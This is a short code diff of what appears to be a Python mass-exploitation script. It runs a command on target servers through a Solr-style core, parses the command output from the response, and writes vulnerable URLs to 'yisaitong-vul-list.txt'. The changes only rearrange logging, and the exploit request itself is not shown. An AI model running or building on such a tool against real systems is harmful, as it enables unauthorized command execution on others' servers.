@@ -58,15 +58,20 @@ def exp(target, core_name, cmd, logs_file):
                           verify=False, timeout=8)
         final_result = r.text
         if r.status_code == 200:
-            print("有漏洞！！！", file=logs_file)
+
             result = re.search(
                 r'documents"><lst><arr name="title"><str>([\s\S]*?)</str></arr></lst>', final_result, re.I)
             if result:
                 final_result = result.group(1)
             else:
-                print("正则没匹配到，直接输出原文", file=logs_file)
+                print("没有洞，GG")
+                return False
+            print("有漏洞！！！", file=logs_file)
+            print("有漏洞！！！")
             print("命令执行结果：", file=logs_file)
+            print("命令执行结果：")
             print(final_result, file=logs_file)
+            print(final_result)
             return True
         else:
             print("没有洞，GG")
@@ -156,5 +161,5 @@ if __name__ == '__main__':
                 print('NO VUL' + url, file=logs_file)
         if len(vul_url_list) > 0:
             write_file(vul_url_list)
-            print("有漏洞了url列表已经写入文件当前目录下的 yisaitong-vul-list.txt 了")
+            print("url列表已经写入文件当前目录下的 yisaitong-vul-list.txt 了")
     logs_file.close()
